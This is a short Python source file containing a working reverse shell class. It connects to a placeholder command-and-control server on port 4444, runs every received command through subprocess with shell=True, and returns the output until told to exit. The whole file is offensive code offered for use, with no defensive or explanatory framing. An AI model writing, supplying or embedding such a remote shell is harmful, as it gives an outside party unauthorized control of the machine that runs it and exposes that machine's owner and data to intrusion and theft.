import socket
import subprocess
import threading

class ReverseShell:
    def __init__(self):
        self.server_ip = "YOUR_C2_SERVER_IP"
        self.server_port = 4444

    def start_reverse_shell(self):
        print(f"Attempting reverse shell connection to {self.server_ip}:{self.server_port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.server_ip, self.server_port))

        while True:
            command = sock.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                sock.close()
                break
            else:
                result = self.execute_command(command)
                sock.send(result.encode('utf-8'))

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True)
            return result.stdout.decode() + result.stderr.decode()
        except Exception as e:
            return str(e)
